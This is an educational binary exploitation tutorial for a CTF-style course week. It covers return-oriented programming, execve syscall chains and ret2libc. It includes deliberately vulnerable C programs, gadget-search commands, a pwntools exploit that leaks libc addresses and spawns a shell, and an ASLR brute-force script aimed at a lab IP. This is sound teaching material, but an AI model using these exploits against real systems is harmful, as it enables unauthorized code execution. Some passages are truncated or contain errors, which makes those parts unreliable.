# Week13 PWN: ROL and ROP

## Return Oriented Programming

Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things.

As we saw in [buffer overflows](https://ctf101.org/binary-exploitation/buffer-overflow), having stack control can be very powerful since it allows us to overwrite saved instruction pointers, giving us control over what the program does next. Most programs don't have a convenient `give_shell` function however, so we need to find a way to manually invoke `system` or another `exec` function to get us our shell.

### 32 bit

Imagine we have a program similar to the following:

```
#include <stdio.h>
#include <stdlib.h>

char name[32];

int main() {
    printf("What's your name? ");
    read(0, name, 32);

    printf("Hi %s\n", name);

    printf("The time is currently ");
    system("/bin/date");

    char echo[100];
    printf("What do you want me to echo back? ");
    read(0, echo, 1000);
    puts(echo);

    return 0;
}
```

We obviously have a stack buffer overflow on the `echo` variable which can give us EIP control when `main` returns. But we don't have a `give_shell` function! So what can we do?

We can call `system` with an argument we control! Since arguments are passed in on the stack in 32-bit Linux programs (see [calling conventions](https://ctf101.org/binary-exploitation/what-are-calling-conventions)), if we have stack control, we have argument control.

When main returns, we want our stack to look like something had normally called `system`. Recall what is on the stack after a function has been called:

```
        ...                                 // More arguments
        0xffff0008: 0x00000002              // Argument 2
        0xffff0004: 0x00000001              // Argument 1
ESP ->  0xffff0000: 0x080484d0              // Return address
```

So `main`'s stack frame needs to look like this:

```
        0xffff0008: 0xdeadbeef              // system argument 1
        0xffff0004: 0xdeadbeef              // return address for system
ESP ->  0xffff0000: 0x08048450              // return address for main (system's PLT entry)
```

Then when `main` returns, it will jump into `system`'s [PLT](https://ctf101.org/binary-exploitation/what-is-the-got/#plt) entry and the stack will appear just like `system` had been called normally for the first time.

Note: we don't care about the return address `system` will return to because we will have already gotten our shell by then!

#### Arguments

This is a good start, but we need to pass an argument to `system` for anything to happen. As mentioned in the page on [ASLR](https://ctf101.org/binary-exploitation/binary-exploitation/address-space-layout-randomization), the stack and dynamic libraries "move around" each time a program is run, which means we can't easily use data on the stack or a string in libc for our argument. In this case however, we have a very convenient `name` global which will be at a known location in the binary (in the BSS segment).

#### Putting it together

Our exploit will need to do the following:

1. Enter "sh" or another command to run as `name`
2. Fill the stack with
   1. Garbage up to the saved EIP
   2. The address of `system`'s PLT entry
   3. A fake return address for system to jump to when it's done
   4. The address of the `name` global to act as the first argument to `system`

### 64 bit

In 64-bit binaries we have to work a bit harder to pass arguments to functions. The basic idea of overwriting the saved RIP is the same, but as discussed in [calling conventions](https://ctf101.org/binary-exploitation/what-are-calling-conventions), arguments are passed in registers in 64-bit programs. In the case of running `system`, this means we will need to find a way to control the RDI register.

To do this, we'll use small snippets of assembly in the binary, called "gadgets." These gadgets usually `pop` one or more registers off of the stack, and then call `ret`, which allows us to chain them together by making a large fake call stack.

For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like [rp++](https://github.com/0vercl0k/rp) or [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)):

```
0x400c01: pop rdi; ret
0x400c03: pop rsi; pop r15; ret
```

We can setup a fake call stack with these gadets to sequentially execute them, `pop`ing values we control into registers, and then end with a jump to `system`.

#### Example

```
        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled
        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)
        0xffff0018: 0x1337beef          // value we want in rsi
        0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget
        0xffff0008: 0xdeadbeef          // value to be popped into rdi
RSP ->  0xffff0000: 0x400c01            // address of rdi gadget
```

Stepping through this one instruction at a time, `main` returns, jumping to our `pop rdi` gadget:

```
RIP = 0x400c01 (pop rdi)
RDI = UNKNOWN
RSI = UNKNOWN

        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled
        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)
        0xffff0018: 0x1337beef          // value we want in rsi
        0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget
RSP ->  0xffff0008: 0xdeadbeef          // value to be popped into rdi
```

`pop rdi` is then executed, popping the top of the stack into RDI:

```
RIP = 0x400c02 (ret)
RDI = 0xdeadbeef
RSI = UNKNOWN

        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled
        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)
        0xffff0018: 0x1337beef          // value we want in rsi
RSP ->  0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget
```

The RDI gadget then `ret`s into our RSI gadget:

```
RIP = 0x400c03 (pop rsi)
RDI = 0xdeadbeef
RSI = UNKNOWN

        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled
        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)
RSP ->  0xffff0018: 0x1337beef          // value we want in rsi
```

RSI and R15 are popped:

```
RIP = 0x400c05 (ret)
RDI = 0xdeadbeef
RSI = 0x1337beef

RSP ->  0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled
```

And finally, the RSI gadget `ret`s, jumping to whatever function we want, but now with RDI and RSI set to values we control.

## ROP - Syscall execv

The objective is to call the syscall (execv) from a ROP controlling the value of registries: *RDI, RSI, RDX, RAX* and obviously the *RIP* (the other ones doesn't matters), and controlling somewhere to write *"/bin/sh"*

- RDI: Pointing to the string "/bin/bash"
- RSI: Null
- RDX: Null
- RAX: Value 0x3b for x64 and 0xb for x32, because this will call execv

```
ROPgadget --binary vulnbinary | grep syscall
ROPgadget --binary vulnbinary | grep "rdi\|rsi\|rdx\|rax" | grep pop
```

### Writing

If you can somehow write to an address and then get the address of where you have written then this step is unnecessary.

Elsewhere, you may search for some write-what-where.
As is explained in this tutorial: https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ you have to find something that allows you to save some value inside a registry and then save it to some controlled address inside another registry. For example some `pop eax; ret` , `pop edx: ret` , `mov eax, [edx]`

You can find mov gadgets doing: `ROPgadget --binary vulnbinary | grep mov`

#### Finding a place to write

If you have found some write-what-where and can control the needed registries to call execv, there is only left finding a place to write.

```
objdump -x vulnbinary | grep ".bss" -B1
                  CONTENTS, ALLOC, LOAD, DATA
 23 .bss          00000010  00403418  00403418  00002418  23
```

In this case: 0x403418

#### Writing *"/bin/sh"*

```
buffer += address(pop_eax) # place value into EAX
buffer += "/bin"           # 4 bytes at a time
buffer += address(pop_edx)         # place value into edx
buffer += address(writable_memory)
buffer += address(writewhatwhere)

buffer += address(pop_eax)
buffer += "//sh"
buffer += address(pop_edx)
buffer += address(writable_memory + 4)
buffer += address(writewhatwhere)
```

## ROP - Leaking LIBC address

### Quick Resume

1. Find overflow offset
2. Find POP_RDI, PUTS_PLT and MAIN_PLT gadgets
3. Find memory address of puts and guess the libc version (donwload it)
4. Given the library just exploit it

### Other tutorials and binaries to practice

This tutorial is going to exploit the code/binary proposed in this tutorial: https://tasteofsecurity.com/security/ret2libc-unknown-libc/
Another useful tutorial: https://made0x78.com/bseries-ret2libc/

### Code

Filename: `vuln.c`

```
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```

### ROP - PWNtools template

[Find my ROP-PWNtools template here.](https://github.com/carlospolop/hacktricks/blob/master/exploiting/linux-exploiting-basic-esp/rop-pwn-template.md) I'm going to use the code located there to make the exploit.
Download the exploit and place it in the same directory as the vulnerable binary.

### 1- Finding the offset

The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default `OFFSET = ""`):

```
####################
#### Find offset ###
####################
OFFSET = ""#"A"*72
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    return
```

Execute `python template.py` a GDB console will be opened with the program being crashed. Inside that GDB console execute `x/wx $rsp` to get the bytes that were going to overwrite the RIP. Finally get the offset using a python console:

```
from pwn import *
cyclic_find(0x6161616b)
```

[![img](https://github.com/carlospolop/hacktricks/raw/master/.gitbook/assets/image%20%28188%29.png)](https://github.com/carlospolop/hacktricks/blob/master/.gitbook/assets/image (188).png)

After finding the offset (in this case 40) change the OFFSET variable inside the template using that value.
`OFFSET = "A" * 40`

### 2- Finding Gadgets

Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call `puts`to find the libc being used, and later to launch the final exploit.

```
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```

The `PUTS_PLT` is needed to call the function puts.
The `MAIN_PLT` is needed to call the main function again after one interaction to exploit the overflow again (infinite rounds of exploitation).It is used at the end of each ROP.
The POP_RDI is needed to pass a parameter to the called function.

In this step you don't need to execute anything as everything will be found by pwntools during the execution.

### 3- Finding LIBC library

Now is time to find which version of the libc library is being used. To do so we are going to leak the address in memory of the function `puts`and then we are going to search in which library version the puts version is in that address.

```
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()
```

To do so, the most important line of the executed code is:

```
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```

This will send some bytes util overwriting the RIP is possible: `OFFSET`.
Then, it will set the address of the gadget `POP_RDI` so the next address (`FUNC_GOT`) will be saved in the RDI registry. This is because we want to call puts passing it the address of the `PUTS_GOT`as the address in memory of puts function is saved in the address pointing by `PUTS_GOT`.
After that, `PUTS_PLT` will be called (with `PUTS_GOT` inside the RDI) so puts will read the content inside `PUTS_GOT` (the address of puts function in memory) and will print it out.
Finally, main function is called again so we can exploit the overflow again.

This way we have tricked puts function to print out the address in memory of the function puts (which is inside libc library). Now that we have that address we can search which libc version is being used.

[![img](https://github.com/carlospolop/hacktricks/raw/master/.gitbook/assets/image%20%2881%29.png)](https://github.com/carlospolop/hacktricks/blob/master/.gitbook/assets/image (81).png)

As we are exploiting some local binary it is not needed to figure out which version of libc is being used (just find the library in `/lib/x86_64-linux-gnu/libc.so.6`).
But, in a remote exploit case I will explain here how can you find it:

#### 3.1- Searching for libc version (1)

You can search which library is being used in the web page: https://libc.blukat.me/
It will also allow you to download the discovered version of libc

[![img](https://github.com/carlospolop/hacktricks/raw/master/.gitbook/assets/image%20%2816%29.png)](https://github.com/carlospolop/hacktricks/blob/master/.gitbook/assets/image (16).png)

#### 3.2- Searching for libc version (2)

You can also do:

- `$ git clone https://github.com/niklasb/libc-database.git`
- `$ cd libc-database`
- `$ ./get`

This will take some time, be patient.
For this to work we need:

- Libc symbol name: `puts`
- Leaked libc adddress: `0x7ff629878690`

We can figure out which libc that is most likely used.

```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```

We get 2 matches (you should try the second one if the first one is not working). Download the first one:

```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```

Copy the libc from `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` to our working directory.

#### 3.3- Other functions to leak

```
puts
printf
__libc_start_main
read
gets
```

### 4- Finding based libc address & exploiting

At this point we should know the libc library used. As we are exploiting a local binary I will use just:`/lib/x86_64-linux-gnu/libc.so.6`

So, at the begging of `template.py` change the libc variable to: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

Giving the path to the libc library the rest of the exploit is going to be automatically calculated.

Inside the `get_addr`function the base address of libc is going to be calculated:

```
if libc != "":
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
```

Then, the address to the function `system` and the address to the string *"/bin/sh"* are going to be calculated from the base address of libc and given the libc library.

```
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```

Finally, the /bin/sh execution exploit is going to be prepared sent:

```
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

##### Interact with the shell #####
p.interactive() #Interact with the conenction
```

Let's explain this final ROP.
The last ROP (`rop1`) ended calling again the main function, then we can exploit again the overflow (that's why the `OFFSET` is here again). Then, we want to call `POP_RDI` pointing to the addres of *"/bin/sh"* (`BINSH`) and call system function (`SYSTEM`) because the address of *"/bin/sh"* will be passed as a parameter.
Finally, the address of exit function is called so the process exists nicely and any alert is generated.

This way the exploit will execute a */bin/sh* shell.

[![img](https://github.com/carlospolop/hacktricks/raw/master/.gitbook/assets/image%20%28255%29.png)](https://github.com/carlospolop/hacktricks/blob/master/.gitbook/assets/image (255).png)

### 4(2)- Using ONE_GADGET

You could also use [ONE_GADGET ](https://github.com/david942j/one_gadget)to obtain a shell instead of using system and "/bin/sh". ONE_GADGET will find inside the libc library some way to obtain a shell using just one ROP.
However, normally there are some constrains, the most common ones and easy to avoid are like `[rsp+0x30] == NULL` As you control the values inside the RSP you just have to send some more NULL values so the constrain is avoided.

```
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```

### EXPLOIT FILE

You can find a template to exploit this vulnerability here:

[ROP-PWN template](https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-pwn-template)

### Common problems

#### MAIN_PLT = elf.symbols['main'] not found

If the "main" symbol does not exist. Then you can just where is the main code:

```
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```

and set the address manually:

```
MAIN_PLT = 0x401080
```

#### Puts not found

If the binary is not using Puts you should check if it is using

#### `sh: 1: %s%s%s%s%s%s%s%s: not found`

If you find this error after creating all the exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Try to subtract 64 bytes to the address of "/bin/sh":

```
BINSH = next(libc.search("/bin/sh")) - 64
```

## Ret2Lib

**If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow.**

### If you are **inside** the **host**

#### You can find the **address of lib**c

```
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```

If you want to check if the ASLR is changing the address of libc you can do:

```
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```

#### Get offset of system function

```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

#### Get offset of "/bin/sh"

```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

#### /proc/\<PID>/maps

If the process is creating **children** every time you talk with it (network server) try to **read** that file (probably you will need to be root).

Here you can find **exactly where is the libc loaded** inside the process and **where is going to be loaded** for every children of the process.

[![img](https://github.com/carlospolop/hacktricks/raw/master/.gitbook/assets/image%20%2899%29.png)](https://github.com/carlospolop/hacktricks/blob/master/.gitbook/assets/image (99).png)

In this case it is loaded in **0xb75dc000** (This will be the base address of libc)

#### Using gdb-peda

Get address of **system** function, of **exit** function and of the string **"/bin/sh"** using gdb-peda:

```
p system
p exit
find "/bin/sh"
```

### Bypassing ASLR

You can try to bruteforce the abse address of libc.

```
for off in range(0xb7000000, 0xb8000000, 0x1000):
```

### Code

```
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
    p = ""
    p += p32(off + 0x0003cb20) #system
    p += "CCCC" #GARBAGE
    p += p32(off + 0x001388da) #/bin/sh
    payload = 'A'*0x20010 + p
    c.send(payload)
    c.interactive() #?
```

